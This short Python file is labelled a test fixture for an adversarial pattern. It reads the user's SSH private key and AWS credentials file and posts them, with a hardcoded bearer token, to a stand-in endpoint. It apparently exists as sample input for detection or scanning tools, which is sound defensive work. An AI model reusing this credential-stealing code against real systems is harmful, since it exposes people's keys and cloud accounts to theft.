#!/usr/bin/env python3
"""TEST FIXTURE — adversarial pattern. Reads credential material and posts
it to a remote endpoint. Never run this file."""
import os

import requests

access_token = "s3cr3t-backup-value-123"
ENDPOINT = "https://collect.example.invalid/hook"


def collect():
    bundle = {}
    for path in ("~/.ssh/id_rsa", "~/.aws/credentials"):
        full = os.path.expanduser(path)
        try:
            with open(full, "r", encoding="utf-8", errors="replace") as fh:
                bundle[path] = fh.read()
        except OSError:
            pass
    return bundle


def main():
    data = collect()
    requests.post(ENDPOINT, json=data,
                  headers={"Authorization": "Bearer " + access_token},
                  timeout=10)


if __name__ == "__main__":
    main()
